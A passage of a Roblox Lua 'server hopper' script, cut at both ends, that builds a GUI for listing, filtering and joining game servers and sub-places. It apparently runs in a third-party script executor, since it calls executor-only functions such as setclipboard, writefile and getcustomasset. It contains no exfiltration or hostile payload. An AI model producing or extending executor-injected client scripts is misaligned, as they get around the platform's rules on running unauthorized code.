local Serv, ServCount = makePanel("ServersPanel", UDim2.fromScale(0.42, 1), 3, "SERVERS", "")

local function scroller(parent, name, order)
	local s = make("ScrollingFrame", {
		Name = name, Parent = parent, Size = UDim2.fromScale(1, 0.89),
		LayoutOrder = order, BackgroundTransparency = 1, BorderSizePixel = 0,
		ScrollBarThickness = 3, ScrollBarImageColor3 = C.white, ScrollBarImageTransparency = 0.6,
		CanvasSize = UDim2.new(), AutomaticCanvasSize = Enum.AutomaticSize.Y,
		ScrollingDirection = Enum.ScrollingDirection.Y,
	})
	make("UIListLayout", {
		Name = name .. "Layout", Parent = s,
		SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 6),
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
	})
	make("UIPadding", {
		Name = name .. "Padding", Parent = s,
		PaddingLeft = UDim.new(0, 6), PaddingRight = UDim.new(0, 6),
		PaddingTop = UDim.new(0, 4), PaddingBottom = UDim.new(0, 10),
	})
	return s
end

local SideScroll = scroller(Side, "SubPlacesScroll", 2)
local ServScroll = scroller(Serv, "ServersScroll", 2)

local CtrlList = make("ScrollingFrame", {
	Name = "ControlsList", Parent = Ctrl, Size = UDim2.fromScale(1, 0.89),
	LayoutOrder = 2, BackgroundTransparency = 1, BorderSizePixel = 0,
	ScrollBarThickness = 3, ScrollBarImageColor3 = C.white, ScrollBarImageTransparency = 0.6,
	CanvasSize = UDim2.new(), AutomaticCanvasSize = Enum.AutomaticSize.Y,
	ScrollingDirection = Enum.ScrollingDirection.Y,
})
make("UIListLayout", {
	Name = "ControlsLayout", Parent = CtrlList,
	SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 4),
	HorizontalAlignment = Enum.HorizontalAlignment.Center,
})
make("UIPadding", {
	Name = "ControlsPadding", Parent = CtrlList,
	PaddingLeft = UDim.new(0, 2), PaddingRight = UDim.new(0, 2),
	PaddingTop = UDim.new(0, 2), PaddingBottom = UDim.new(0, 4),
})

local PlaceBox = textbox(CtrlList, "PlaceIdBox", "Place ID", 1, true, 20)
PlaceBox.Text = tostring(game.PlaceId)
local ServerBox = textbox(CtrlList, "ServerIdBox", "Server ID or link", 2, false, 200)
local TargetBox = textbox(CtrlList, "TargetPlayersBox", "Hop to server with N players", 3, true, 3)
local FilterBox = textbox(CtrlList, "FilterPlayersBox", "Filter list by player count", 4, true, 3)

local function row(parent, name, order)
	return make("Frame", {
		Name = name, Parent = parent, Size = UDim2.fromScale(1, 0.115),
		BackgroundTransparency = 1, LayoutOrder = order,
	})
end
local row1 = row(CtrlList, "ActionRow", 5)
local row2 = row(CtrlList, "ToggleRow", 6)
local HopBtn = button(row1, "HopButton", "Hop", UDim2.fromScale(0, 0), UDim2.fromScale(0.49, 1))
local JoinIdBtn = button(row1, "JoinIdButton", "Join ID", UDim2.fromScale(0.51, 0), UDim2.fromScale(0.49, 1))
local SortBtn = button(row2, "SortButton", "Sort: Low-High", UDim2.fromScale(0, 0), UDim2.fromScale(0.49, 1),
	{ color = C.white, transp = 0.88, max = 12 })
local FullToggle = toggle(row2, "FullToggle", "Hide full", UDim2.fromScale(0.51, 0), UDim2.fromScale(0.49, 1),
	{ color = C.white, transp = 0.88 })
local RefreshBtn = button(CtrlList, "RefreshButton", "Refresh", UDim2.new(), UDim2.fromScale(1, 0.115),
	{ order = 7, color = C.good, transp = 0.3 })
RefreshBtn.Size = UDim2.fromScale(1, 0.115)

local StatusBar = make("Frame", {
	Name = "StatusBar", Parent = Body, Size = UDim2.new(1, 0, 0.05, 0),
	BackgroundTransparency = 1, LayoutOrder = 3,
})
hlist(StatusBar, 0.01)
local StatusLabel = label(StatusBar, "StatusLabel", "Ready", UDim2.new(), UDim2.fromScale(1, 1),
	{ color = C.dim, max = 13 })
StatusLabel.LayoutOrder = 1

local function setStatus(text, kind)
	StatusLabel.Text = text
	StatusLabel.TextTransparency = 0.7
	tween(StatusLabel, 0.3, {
		TextTransparency = 0,
		TextColor3 = kind == "bad" and C.bad or kind == "good" and C.good or C.dim,
	})
end

local function copy(text, msg)
	local ok = pcall(function() setclipboard(text) end)
	setStatus(ok and msg or "Clipboard not supported by this executor", ok and "good" or "bad")
	if ok then
		pcall(function() StarterGui:SetCore("SendNotification", { Title = "Copied", Text = msg, Duration = 3 }) end)
	end
end

local iconLabels = { Icon }

local function setIcon(universe)
	if state.iconFor == universe then return end
	state.iconFor = universe
	local url = ("rbxthumb://type=GameIcon&id=%d&w=150&h=150"):format(math.floor(universe))
	for _, im in ipairs(iconLabels) do
		im.ImageTransparency = 1
		im.Image = url
		tween(im, 0.5, { ImageTransparency = 0 })
	end

	task.spawn(function()
		local failed = false
		pcall(function()
			ContentProvider:PreloadAsync({ Icon }, function(_, status)
				if status == Enum.AssetFetchStatus.Failure then failed = true end
			end)
		end)
		if failed and writefile and getcustomasset then
			pcall(function()
				local res = apiGet("thumbnails", ("v1/games/icons?universeIds=%d&size=150x150&format=Png"):format(universe))
				local img = res and res.data and res.data[1] and res.data[1].imageUrl
				if img and state.iconFor == universe then
					local file = "srvhop_icon_" .. universe .. ".png"
					writefile(file, game:HttpGet(img))
					local asset = getcustomasset(file)
					for _, im in ipairs(iconLabels) do im.Image = asset end
				end
			end)
		end
	end)
end

local function setVal(lbl, text)
	if lbl.Text ~= text then
		local first = lbl.Text == "-"
		lbl.Text = text
		if not first then
			lbl.TextColor3 = C.good
			tween(lbl, 1.2, { TextColor3 = C.text })
		end
	end
end

local placeMaxLabels = {}

local maxCache, infoCache = {}, {}

local function getPlaceInfo(placeId)
	if infoCache[placeId] then return infoCache[placeId] end
	local ok, info = pcall(function()
		return MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset)
	end)
	if ok and type(info) == "table" then
		infoCache[placeId] = info
		return info
	end
end

local function getPlaceMax(placeId, g)
	if maxCache[placeId] then return maxCache[placeId] end
	local m
	if placeId == game.PlaceId and Players.MaxPlayers > 0 then
		m = Players.MaxPlayers
	else
		if state.serversPlace == placeId then
			for _, srv in ipairs(state.servers) do
				if (srv.maxPlayers or 0) > 0 then m = srv.maxPlayers break end
			end
		end
		m = m or fetchPlaceMaxPlayers(placeId)
		if not m and placeId == game.PlaceId and g and (g.maxPlayers or 0) > 0 then m = g.maxPlayers end
	end
	if m and m > 0 then
		maxCache[placeId] = m
		setPlaceMax(placeId, m)
	end
	return m
end

local heroCreator = { name = "" }
local function renderCreatorText(placeId, g)
	Creator.Text = esc(heroCreator.name) .. "     " .. rich("users", false) .. " " .. (getPlaceMax(placeId, g) or "-")
end

local function sumPlaying(placeId)
	local n = 0
	if state.serversPlace == placeId then
		for _, s in ipairs(state.servers) do n += s.playing or 0 end
	end
	if placeId == game.PlaceId then n = math.max(n, #Players:GetPlayers()) end
	return n
end

local favCache = {}
local function getFavorites(universe)
	if not universe then return end
	if favCache[universe] then return favCache[universe] end
	local res = apiGet("games", ("v1/games/%d/favorites/count"):format(universe))
	local c = res and tonumber(res.favoritesCount)
	if c then favCache[universe] = c end
	return c
end

local function updateVisits(placeId)
	placeId = placeId or state.placeId
	if state.visitsVal and state.visitsPlace == placeId then
		heroStats.visits = abbr(state.visitsVal)
	else
		heroStats.visits = nil
	end
	renderStats()
end

local function updatePlaying(placeId)
	placeId = placeId or state.placeId
	local n = sumPlaying(placeId)
	if state.apiPlaying and state.apiPlayingPlace == placeId then
		n = math.max(n, state.apiPlaying)
	end
	heroStats.playing = commas(n)
	renderStats()
end

local function applyStats(g, v, placeId)
	placeId = placeId or state.placeId
	local name = g and g.name
	local creator = g and g.creator and g.creator.name
	local cid = g and g.creator and tonumber(g.creator.id)
	local ctype = g and g.creator and g.creator.type
	local hidden = (not name) or name:find("UNAVAILABLE") ~= nil
		or (not creator) or creator:find("UNKNOWN") ~= nil

	if hidden then
		local info = getPlaceInfo(placeId)
		if info then
			if info.Name and info.Name ~= "" then name = info.Name end
			if info.Creator and info.Creator.Name then creator = info.Creator.Name end
			if info.Creator and tonumber(info.Creator.Id) then
				cid, ctype = tonumber(info.Creator.Id), info.Creator.CreatorType
			end
		end
	end
	if not name or name:find("UNAVAILABLE") then name = "Place " .. placeId end
	if not creator or creator:find("UNKNOWN") then creator = "Unknown" end

	GameName.Text = name
	heroCreator.name = creator
	renderCreatorText(placeId, g)
	if cid and cid > 0 then setCreatorAvatar(cid, ctype) end

	if not hidden and g and g.playing then
		state.apiPlaying, state.apiPlayingPlace = g.playing, placeId
	else
		state.apiPlaying, state.apiPlayingPlace = nil, nil
	end
	updatePlaying(placeId)
	state.visitsVal = (not hidden and g and g.visits) or nil
	state.visitsPlace = placeId
	updateVisits(placeId)
	local fav = (not hidden and g) and g.favoritedCount
		or getFavorites(universeCache[placeId] or state.universe)
	heroStats.fav = fav and abbr(fav) or "-"
	renderStats()

	if v then
		local up, down = v.upVotes or 0, v.downVotes or 0
		local total = up + down
		heroStats.up, heroStats.down = abbr(up), abbr(down)
		heroStats.pct = total > 0 and (math.floor(up / total * 100 + 0.5) .. "%") or ""
		heroStats.ratio = total > 0 and up / total or 0
	else
		heroStats.up, heroStats.down, heroStats.pct, heroStats.ratio = "-", "-", "", 0
	end
	renderStats()
end

local function teleportTo(placeId, jobId)
	visited.ids[jobId] = true
	saveVisited()
	return pcall(function()
		TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
	end)
end

local function reportTeleportError(placeId, err)
	if placeId ~= game.PlaceId then
		setStatus("Teleport failed - disable Verify Teleports and check the Place ID", "bad")
	else
		setStatus("Teleport failed: " .. tostring(err), "bad")
	end
end

local function randomTeleport(placeId)
	local ok, err = pcall(function() TeleportService:Teleport(placeId, LocalPlayer) end)
	if not ok then reportTeleportError(placeId, err) end
	return ok, err
end

local function hop(placeId, target)
	state.hopId += 1
	local my = state.hopId
	local function cancelled() return not state.alive or my ~= state.hopId end
	local deadline = os.clock() + 90
	setStatus(("Searching for a server with %d players..."):format(target))

	local order = "Desc"
	repeat
		local found
		local _, err = eachPage(placeId, 15, cancelled, function(page)
			for _, s in ipairs(page) do
				if s.playing == target and s.playing < s.maxPlayers and s.id ~= game.JobId and not visited.ids[s.id] then
					found = s
					return true
				end
			end
		end, order)
		if err == "cancelled" then return end
		if found then
			setStatus(("Joining server with %d players..."):format(target), "good")
			local ok, e = teleportTo(placeId, found.id)
			if not ok then reportTeleportError(placeId, e) end
			return
		end
		if order == "Desc" then
			order = "Asc"
		else
			task.wait(2)
		end
	until os.clock() > deadline or cancelled()

	if cancelled() then return end
	setStatus("No matching server found - joining a random one...")
	randomTeleport(placeId)
end

local function fillColor(r)
	if r < 0.5 then return C.good:Lerp(C.warn, r * 2) end
	return C.warn:Lerp(C.bad, (r - 0.5) * 2)
end

local EmptyLabel = label(ServScroll, "EmptyLabel", "", UDim2.new(), UDim2.fromScale(1, 0.1),
	{ color = C.dim, align = Enum.TextXAlignment.Center, max = 13 })
EmptyLabel.LayoutOrder = 1000

local CurCard = make("Frame", {
	Name = "CurrentServerCard", Parent = ServScroll,
	Size = UDim2.new(1, 0, 0, 58), LayoutOrder = 0, BorderSizePixel = 0,
	BackgroundColor3 = C.accent, BackgroundTransparency = 0.82,
})
corner(CurCard, 0.14)
stroke(CurCard, 0.3, C.accent)

padPx(CurCard, 8, 4)
hlist(CurCard, 0.03)

local CurLeft = make("Frame", {
	Name = "CurrentLeft", Parent = CurCard, Size = UDim2.new(0.58, 0, 0, 50),
	BackgroundTransparency = 1, LayoutOrder = 1,
})
vlist(CurLeft, 3)
local CurBadge = label(CurLeft, "CurrentBadge", "YOU ARE HERE", UDim2.new(), UDim2.new(1, 0, 0, 11),
	{ color = C.accent, font = Enum.Font.GothamBold, max = 12 })
CurBadge.LayoutOrder = 1
local CurPlayers = label(CurLeft, "CurrentPlayers", "-", UDim2.new(), UDim2.new(1, 0, 0, 17),
	{ font = Enum.Font.GothamBold, max = 22 })
CurPlayers.LayoutOrder = 2
local CurInfo = label(CurLeft, "CurrentInfo", "-", UDim2.new(), UDim2.new(1, 0, 0, 11),
	{ color = C.dim, max = 11 })
CurInfo.LayoutOrder = 3
local CurBar = make("Frame", {
	Name = "CurrentBar", Parent = CurLeft, Size = UDim2.new(1, 0, 0, 4), LayoutOrder = 4,
	BackgroundColor3 = C.white, BackgroundTransparency = 0.88, BorderSizePixel = 0,
})
corner(CurBar, 0.5)
local CurFill = make("Frame", {
	Name = "CurrentFill", Parent = CurBar,
	Size = UDim2.fromScale(0, 1), BackgroundColor3 = C.good, BorderSizePixel = 0,
})
corner(CurFill, 0.5)

local CurRight = make("Frame", {
	Name = "CurrentButtons", Parent = CurCard, Size = UDim2.new(0.36, 0, 0, 50),
	BackgroundTransparency = 1, LayoutOrder = 2,
})
vlist(CurRight, 4)
local Rejoin = button(CurRight, "RejoinButton", "Rejoin", UDim2.new(), UDim2.new(1, 0, 0, 23),
	{ max = 13, order = 1 })
local CurCopy = button(CurRight, "CopyServerButton", "Copy", UDim2.new(), UDim2.new(1, 0, 0, 23),
	{ color = C.white, transp = 0.85, max = 13, order = 2 })

local function updateCurrent()
	local playing = #Players:GetPlayers()
	local maxp = Players.MaxPlayers
	if maxp <= 0 then maxp = math.max(playing, 1) end
	CurPlayers.Text = ("%d/%d"):format(playing, maxp)

	local ratio = math.clamp(playing / math.max(maxp, 1), 0, 1)
	CurFill.Size = UDim2.fromScale(ratio, 1)
	CurFill.BackgroundColor3 = fillColor(ratio)

	local info = {}
	local ok, ping = pcall(function()
		return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
	end)
	if ok and ping then table.insert(info, math.floor(ping) .. "ms") end
	table.insert(info, tostring(game.JobId):sub(1, 8))
	CurInfo.Text = table.concat(info, "  -  ")
end
updateCurrent()
connect(Players.PlayerAdded, function() task.defer(function() updateCurrent(); updatePlaying() end) end)
connect(Players.PlayerRemoving, function() task.defer(function() updateCurrent(); updatePlaying() end) end)

Rejoin.MouseButton1Click:Connect(function()
	setStatus("Rejoining current server...")
	local ok, err = pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer) end)
	if not ok then setStatus("Rejoin failed: " .. tostring(err), "bad") end
end)
CurCopy.MouseButton1Click:Connect(function()
	copy(("roblox://placeId=%d&gameInstanceId=%s"):format(game.PlaceId, game.JobId), "Current server link copied")
end)

task.spawn(function()
	while state.alive do
		task.wait(2)
		if not state.alive then return end
		pcall(updateCurrent)
	end
end)

local function buildServerCard(s, order, pid)
	local card = make("Frame", {
		Name = "ServerCard_" .. tostring(s.id):sub(1, 8), Parent = ServScroll,
		Size = UDim2.new(1, 0, 0, 52), LayoutOrder = order, BorderSizePixel = 0,
		BackgroundColor3 = C.white, BackgroundTransparency = 0.94,
	})
	card:SetAttribute("srv", true)
	local pop = make("UIScale", { Name = "PopScale", Parent = card, Scale = 0.85 })
	card.BackgroundTransparency = 1
	local delay = math.min(order, 12) * 0.035
	tween(pop, 0.35, { Scale = 1 }, Enum.EasingStyle.Back, delay)
	tween(card, 0.3, { BackgroundTransparency = 0.94 }, nil, delay)
	corner(card, 0.14)
	stroke(card, 0.92)

	padPx(card, 8, 4)
	hlist(card, 0.03)

	local left = make("Frame", {
		Name = "InfoStack", Parent = card, Size = UDim2.new(0.58, 0, 0, 44),
		BackgroundTransparency = 1, LayoutOrder = 1,
	})
	vlist(left, 2)

	local players = label(left, "PlayersLabel", ("%d/%d"):format(s.playing, s.maxPlayers), UDim2.new(),
		UDim2.new(1, 0, 0, 20), { font = Enum.Font.GothamBold, max = 22 })
	players.LayoutOrder = 1
	local info = {}
	if s.ping then table.insert(info, math.floor(s.ping) .. "ms") end
	table.insert(info, tostring(s.id):sub(1, 8))
	local infoLbl = label(left, "InfoLabel", table.concat(info, "  -  "), UDim2.new(),
		UDim2.new(1, 0, 0, 12), { color = C.dim, max = 11 })
	infoLbl.LayoutOrder = 2

	local ratio = math.clamp(s.playing / math.max(s.maxPlayers, 1), 0, 1)
	local bar = make("Frame", {
		Name = "FillBar", Parent = left, Size = UDim2.new(1, 0, 0, 4), LayoutOrder = 3,
		BackgroundColor3 = C.white, BackgroundTransparency = 0.88, BorderSizePixel = 0,
	})
	corner(bar, 0.5)
	local fill = make("Frame", {
		Name = "Fill", Parent = bar,
		Size = UDim2.fromScale(ratio, 1),
		BackgroundColor3 = fillColor(ratio), BorderSizePixel = 0,
	})
	corner(fill, 0.5)

	local right = make("Frame", {
		Name = "ButtonStack", Parent = card, Size = UDim2.new(0.36, 0, 0, 44),
		BackgroundTransparency = 1, LayoutOrder = 2,
	})
	vlist(right, 4)
	local join = button(right, "JoinButton", "Join", UDim2.new(), UDim2.new(1, 0, 0, 20), { order = 1 })
	local cp = button(right, "CopyLinkButton", "Copy Link", UDim2.new(), UDim2.new(1, 0, 0, 20),
		{ color = C.white, transp = 0.85, max = 12, order = 2 })

	join.MouseButton1Click:Connect(function()
		setStatus(("Joining server with %d players..."):format(s.playing))
		local ok, err = teleportTo(pid, s.id)
		if not ok then reportTeleportError(pid, err) end
	end)
	cp.MouseButton1Click:Connect(function()
		copy(("roblox://placeId=%d&gameInstanceId=%s"):format(pid, s.id), "Server link copied")
	end)
end

local function renderServers()
	for _, c in ipairs(ServScroll:GetChildren()) do
		if c:GetAttribute("srv") then c:Destroy() end
	end
	local pid = state.serversPlace
	local list = {}
	for _, s in ipairs(state.servers) do
		local skip = (pid == game.PlaceId and s.id == game.JobId)
			or (state.filter and s.playing ~= state.filter)
			or (state.hideFull and s.playing >= s.maxPlayers)
		if not skip then table.insert(list, s) end
	end
	table.sort(list, function(a, b)
		if state.sort == "Low-High" then return a.playing < b.playing end
		return a.playing > b.playing
	end)
	for i = 1, math.min(#list, 150) do buildServerCard(list[i], i, pid) end
	EmptyLabel.Text = #list == 0 and "No servers match" or ""
	ServCount.Text = ("%d found"):format(#list + (pid == game.PlaceId and 1 or 0))
end

local function refreshServers()
	state.gen += 1
	local gen, pid = state.gen, state.placeId
	local order = state.sort == "High-Low" and "Desc" or "Asc"
	local function cancelled() return not state.alive or gen ~= state.gen end

	setStatus("Fetching servers...")
	task.spawn(function()
		local list = {}
		local seen = {}
		local attempt = 0
		local maxAttempts = 8
		local backoff = 1.5

		while attempt < maxAttempts and not cancelled() do
			attempt += 1
			list, seen = {}, {}

			local ok, err = eachPage(pid, MAX_PAGES, cancelled, function(page, n)
				for _, s in ipairs(page) do
					if s.id and not seen[s.id] then
						seen[s.id] = true
						table.insert(list, {
							id = s.id, playing = s.playing or 0,
							maxPlayers = s.maxPlayers or 0, ping = s.ping,
						})
					end
				end
				if n == 1 then
					state.servers, state.serversPlace = list, pid
					renderServers()
					if state.placeId == pid then updatePlaying(pid); updateVisits(pid); renderCreatorText(pid) end
				end
			end, order)

			if cancelled() then return end

			if ok or #list > 0 then
				state.servers, state.serversPlace = list, pid
				renderServers()
				if state.placeId == pid then updatePlaying(pid); updateVisits(pid); renderCreatorText(pid) end
				if ok then
					setStatus(("Loaded %d servers for Place ID %d"):format(#list, pid), "good")
				else
					setStatus(("Loaded %d servers (rate limited, press Refresh for more)"):format(#list))
				end
				return
			end

			if err == "rate" or (err and err:find("rate")) then
				if cancelled() then return end
				local waitT = backoff
				setStatus(("Rate limited - retry %d/%d in %.1fs..."):format(attempt, maxAttempts, waitT), "bad")
				local waited = 0
				while waited < waitT do
					if cancelled() then return end
					local step = math.min(0.25, waitT - waited)
					task.wait(step)
					waited += step
				end
				backoff = math.min(backoff * 1.6, 15)
			else
				if cancelled() then return end
				setStatus(err or "Failed to load servers", "bad")
				return
			end
		end

		if cancelled() then return end
		if #list > 0 then
			state.servers, state.serversPlace = list, pid
			renderServers()
			if state.placeId == pid then updatePlaying(pid); updateVisits(pid); renderCreatorText(pid) end
			setStatus(("Loaded %d servers (gave up after %d retries)"):format(#list, attempt), "bad")
		else
			setStatus(("Rate limited - gave up after %d retries. Press Refresh to try again."):format(attempt), "bad")
		end
	end)
end

local placeCards = {}
local placeJoinButtons = {}
local switchPlace

local function highlightPlace()
	for id, card in pairs(placeCards) do
		local s = card:FindFirstChildOfClass("UIStroke")
		local on = id == state.placeId
		s.Color = on and C.accent or C.white
		s.Transparency = on and 0.15 or 0.92
		card.BackgroundTransparency = on and 0.86 or 0.94
	end
end

local function buildPlaceCard(info, order)
	local card = make("TextButton", {
		Name = "PlaceCard_" .. info.PlaceId, Parent = SideScroll,
		Size = UDim2.new(1, 0, 0, 56), LayoutOrder = order,
		Text = "", AutoButtonColor = false,
		BackgroundColor3 = C.white, BackgroundTransparency = 0.94, BorderSizePixel = 0,
	})
	padPx(card, 6, 4)
	hlist(card, 0.02)
	corner(card, 0.16)
	stroke(card, 0.92)

	local ic = make("ImageLabel", {
		Name = "PlaceIcon", Parent = card,
		LayoutOrder = 1,
		Size = UDim2.new(0.22, 0, 0.85, 0),
		BackgroundColor3 = C.white, BackgroundTransparency = 0.85,
		BorderSizePixel = 0, ScaleType = Enum.ScaleType.Crop,
	})
	corner(ic, 0.2)
	make("UIAspectRatioConstraint", {
		Name = "PlaceIconAspect", Parent = ic,
		AspectRatio = 1,
	})
	if state.iconFor then ic.Image = Icon.Image end
	table.insert(iconLabels, ic)

	local textStack = make("Frame", {
		Name = "PlaceTextStack", Parent = card,
		LayoutOrder = 2,
		Size = UDim2.new(0.36, 0, 0.9, 0),
		BackgroundTransparency = 1,
	})
	make("UIListLayout", {
		Name = "PlaceTextLayout", Parent = textStack,
		SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 2),
		HorizontalAlignment = Enum.HorizontalAlignment.Left,
		VerticalAlignment = Enum.VerticalAlignment.Center,
	})

	local nameLbl = label(textStack, "PlaceNameLabel", info.Name, UDim2.new(), UDim2.new(1, 0, 0.38, 0),
		{ font = Enum.Font.GothamBold, max = 20 })
	nameLbl.LayoutOrder = 1
	nameLbl.TextTruncate = Enum.TextTruncate.AtEnd

	local idLbl = label(textStack, "PlaceIdLabel", "ID " .. info.PlaceId, UDim2.new(), UDim2.new(1, 0, 0.24, 0),
		{ color = C.dim, max = 18 })
	idLbl.LayoutOrder = 2
	idLbl.TextTruncate = Enum.TextTruncate.AtEnd

	local cached = placeMaxCache[info.PlaceId]
	local maxLbl = label(textStack, "PlaceMaxLabel",
		cached and ("Max %d players"):format(cached) or "Max ...",
		UDim2.new(), UDim2.new(1, 0, 0.24, 0),
		{ color = C.good, font = Enum.Font.GothamBold, max = 18 })
	maxLbl.LayoutOrder = 3
	maxLbl.TextTruncate = Enum.TextTruncate.AtEnd
	placeMaxLabels[info.PlaceId] = maxLbl

	local btnStack = make("Frame", {
		Name = "PlaceButtonStack", Parent = card,
		LayoutOrder = 3,
		Size = UDim2.new(0.36, 0, 0.9, 0),
		BackgroundTransparency = 1,
	})
	make("UIListLayout", {
		Name = "PlaceButtonLayout", Parent = btnStack,
		SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 3),
		HorizontalAlignment = Enum.HorizontalAlignment.Right,
		VerticalAlignment = Enum.VerticalAlignment.Center,
	})

	local isCurrent = info.PlaceId == game.PlaceId
	local join = button(btnStack, "PlaceJoinButton", isCurrent and "Rejoin" or "Join",
		UDim2.new(), UDim2.new(1, 0, 0.47, 0),
		{ max = 14, order = 1, color = isCurrent and C.good or C.accent })
	local copyIdBtn = button(btnStack, "PlaceCopyIdButton", "Copy ID",
		UDim2.new(), UDim2.new(1, 0, 0.47, 0),
		{ max = 12, order = 2, color = C.white, transp = 0.85 })
	placeJoinButtons[info.PlaceId] = join

	join.MouseButton1Click:Connect(function()
		if info.PlaceId == game.PlaceId then
			setStatus("Rejoining current place...")
			local ok, err = pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
			end)
			if not ok then setStatus("Rejoin failed: " .. tostring(err), "bad") end
		else
			randomTeleport(info.PlaceId)
		end
	end)
	copyIdBtn.MouseButton1Click:Connect(function()
		copy(("roblox://placeId=%d"):format(info.PlaceId), "Place link copied (ID " .. info.PlaceId .. ")")
	end)
	card.MouseButton1Click:Connect(function() switchPlace(info.PlaceId) end)
	placeCards[info.PlaceId] = card
end

local function relayout(hasSide)
	Side.Visible = hasSide
	if hasSide then
		Ctrl.Size = UDim2.fromScale(0.26, 1)
		Serv.Size = UDim2.fromScale(0.42, 1)
	else
		Ctrl.Size = UDim2.fromScale(0.34, 1)
		Serv.Size = UDim2.fromScale(0.65, 1)
	end
end

local function loadPlaces()
	local places = {}
	local ok, pages = pcall(function() return AssetService:GetGamePlacesAsync() end)
	if ok and pages then
		while true do
			for _, p in ipairs(pages:GetCurrentPage()) do table.insert(places, p) end
			if pages.IsFinished then break end
			if not pcall(function() pages:AdvanceToNextPageAsync() end) then break end
		end
	end
	if #places <= 1 then relayout(false) return end
	table.sort(places, function(a, b)
		if a.PlaceId == game.PlaceId then return true end
		if b.PlaceId == game.PlaceId then return false end
		return a.Name < b.Name
	end)
	for i, p in ipairs(places) do buildPlaceCard(p, i) end
	highlightPlace()

	for i, p in ipairs(places) do
		if placeMaxCache[p.PlaceId] then
			local lbl = placeMaxLabels[p.PlaceId]
			if lbl then lbl.Text = ("Max %d players"):format(placeMaxCache[p.PlaceId]) end
		else
			task.spawn(function()
				task.wait((i - 1) * 0.12)
				if not state.alive then return end
				local lbl = placeMaxLabels[p.PlaceId]
				if not (lbl and lbl.Parent) then return end
				local maxP = (p.PlaceId == game.PlaceId and Players.MaxPlayers > 0 and Players.MaxPlayers)
					or fetchPlaceMaxPlayers(p.PlaceId)
				if maxP and lbl.Parent then
					lbl.Text = ("Max %d players"):format(maxP)
				end
			end)
		end
	end
end

function switchPlace(id, force)
	if not id or id <= 0 then return end
	if id == state.placeId and not force then return end
	state.placeId = id
	if PlaceBox.Text ~= tostring(id) then PlaceBox.Text = tostring(id) end
	CurCard.Visible = id == game.PlaceId
	highlightPlace()

	for pid, btn in pairs(placeJoinButtons) do
		if pid == game.PlaceId then
			btn.Text = "Rejoin"
			btn.BackgroundColor3 = C.good
		else
			btn.Text = "Join"
			btn.BackgroundColor3 = C.accent
		end
	end

	setStatus("Loading game info...")
	task.spawn(function()
		local uni = resolveUniverse(id)
		if state.placeId ~= id then return end
		if uni then
			state.universe = uni
			setIcon(uni)
			local g, v = fetchStats(uni)
			if state.placeId == id then applyStats(g, v, id) end

			local lbl = placeMaxLabels[id]
			if lbl and lbl.Parent then
				local maxP = (id == game.PlaceId and Players.MaxPlayers > 0 and Players.MaxPlayers)
					or placeMaxCache[id]
					or fetchPlaceMaxPlayers(id)
				if maxP and lbl.Parent then
					lbl.Text = ("Max %d players"):format(maxP)
					setPlaceMax(id, maxP)
				end
			end
		else
			state.universe = nil
			applyStats(nil, nil, id)
		end
		refreshServers()
	end)
end

local placeDebounce = 0
connect(PlaceBox:GetPropertyChangedSignal("Text"), function()
	placeDebounce += 1
	local mine, text = placeDebounce, PlaceBox.Text
	task.delay(0.7, function()
		if mine == placeDebounce and state.alive then switchPlace(tonumber(text)) end
	end)
end)

connect(FilterBox:GetPropertyChangedSignal("Text"), function()
	state.filter = tonumber(FilterBox.Text)
	renderServers()
end)

SortBtn.MouseButton1Click:Connect(function()
	state.sort = state.sort == "Low-High" and "High-Low" or "Low-High"
	SortBtn.Text = "Sort: " .. state.sort
	refreshServers()
end)
FullToggle.OnChanged(function(v)
	state.hideFull = v
	renderServers()
end)
RefreshBtn.MouseButton1Click:Connect(function() switchPlace(tonumber(PlaceBox.Text) or game.PlaceId, true) end)

HopBtn.MouseButton1Click:Connect(function()
	local pid = tonumber(PlaceBox.Text) or game.PlaceId
	local target = tonumber(TargetBox.Text)
	if not target then
		setStatus("Teleporting to a random server...")
		randomTeleport(pid)
	else
		task.spawn(hop, pid, target)
	end
end)

JoinIdBtn.MouseButton1Click:Connect(function()
	local text = ServerBox.Text:match("^%s*(.-)%s*$")
	if text == "" then setStatus("Enter a server ID or link first", "bad") return end
	local id, pid = text, tonumber(PlaceBox.Text) or game.PlaceId
	if text:find("://") then
		id = text:match("gameInstanceId=([^&#]+)") or text:match("jobId=([^&#]+)") or text:match("[?&]id=([^&#]+)")
		if not id then setStatus("Couldn't find a server ID in that link", "bad") return end
		local linked = tonumber(text:match("placeId=(%d+)")) or tonumber(text:match("/games/(%d+)"))
		if linked and linked > 0 then pid = linked end
	end
	setStatus("Joining server " .. id:sub(1, 8) .. "...")
	local ok, err = teleportTo(pid, id)
	if not ok then reportTeleportError(pid, err) end
end)

do
	local function IsMouseOverFrame(Frame, Position)
		local p, s = Frame.AbsolutePosition, Frame.AbsoluteSize
		return Position.X >= p.X and Position.X <= p.X + s.X
			and Position.Y >= p.Y and Position.Y <= p.Y + s.Y
	end

	local dragging, dragStart, startPos, currentTouch

	connect(Top.InputBegan, function(input)
		if input.UserInputState ~= Enum.UserInputState.Begin then return end
		if input.UserInputType ~= Enum.UserInputType.MouseButton1
			and input.UserInputType ~= Enum.UserInputType.Touch then return end
		if not IsMouseOverFrame(Top, input.Position) then return end

		dragging = true
		dragStart = input.Position
		startPos = Main.Position
		currentTouch = input.UserInputType == Enum.UserInputType.Touch and input or nil
	end)

	connect(UserInputService.InputChanged, function(input)
		if not dragging then return end
		if input.UserInputType ~= Enum.UserInputType.MouseMovement
			and input ~= currentTouch then return end

		local delta = input.Position - dragStart
		Main.Position = UDim2.new(
			startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y
		)
	end)

	connect(UserInputService.InputEnded, function(input)
		if not dragging then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1
			or (input.UserInputType == Enum.UserInputType.Touch and input == currentTouch) then
			dragging, dragStart, startPos, currentTouch = nil, nil, nil, nil
		end
	end)
end

local RestoreBtn = make("TextButton", {
